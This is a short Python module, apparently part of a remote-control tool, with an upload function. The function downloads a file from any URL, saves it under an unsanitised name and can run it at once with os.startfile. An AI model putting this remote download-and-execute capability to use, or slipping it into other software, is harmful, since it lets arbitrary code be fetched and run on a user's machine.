import requests
import os

from foreign.global_state import *


def upload(filename, execute, file_data, max_file_size, from_url):
  if from_url:
    file_data = requests.get(filename).content
    filename = filename.split('/')[-1]
    
    if (len(file_data) / 1024 / 1024) > max_file_size:
      return {'message': f'File exceeding maximum size of {max_file_size}MB', 'text_mode': 'danger'}

  with open(filename, 'wb') as f:
    f.write(file_data)
      
  if execute:
    os.startfile(filename)
    
  return {'message': f'{filename} succesfully uploaded', 'text_mode': 'success'} 